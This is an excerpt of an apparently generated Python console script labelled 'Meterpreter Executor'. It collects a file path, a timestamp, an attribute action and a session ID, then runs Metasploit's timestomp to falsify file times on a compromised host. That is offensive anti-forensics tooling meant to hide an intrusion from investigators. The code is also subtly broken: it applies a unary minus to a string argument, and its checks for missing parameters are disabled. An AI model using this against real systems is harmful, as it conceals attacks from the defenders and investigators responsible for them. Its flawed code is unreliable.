...
async def main():
    ...
    console.print(f"[bold yellow]  Parameter: file_path[/]")
    console.print(f"  Description: Full path to target file")
    default_val = ""
    user_input = console.input(
        f"[bold]➤ Enter value for file_path [default: {default_val}]: [/]"
    ) or default_val
    if not user_input and False:
        raise ValueError("Missing required parameter: file_path")
    user_params["file_path"] = user_input

    console.print(f"[bold cyan]\n📌[Meterpreter Executor] Step 8 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: timestamp[/]")
    console.print(f"  Description: New timestamp in MM/DD/YYYY HH:MM:SS format")
    default_val = ""
    user_input = console.input(
        f"[bold]➤ Enter value for timestamp [default: {default_val}]: [/]"
    ) or default_val
    if not user_input and False:
        raise ValueError("Missing required parameter: timestamp")
    user_params["timestamp"] = user_input

    console.print(f"[bold cyan]\n📌[Meterpreter Executor] Step 8 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: action[/]")
    console.print(f"  Description: Modification action (m=Modified, a=Accessed, c=Created, e=EntryModified)")
    default_val = ""
    user_input = console.input(
    ...
    console.print(f"[bold cyan]\n[Meterpreter Executor] Executing: timestomp[/]")
    confirm_action()
    try:
        metasploit_executor.timestomp(user_params["file_path"], user_params["timestamp"], -user_params["action"], user_params["meterpreter_sessionid"])
    except Exception as e:
        console.print(f"[bold red]✗ Command failed: {str(e)}[/]")
        raise
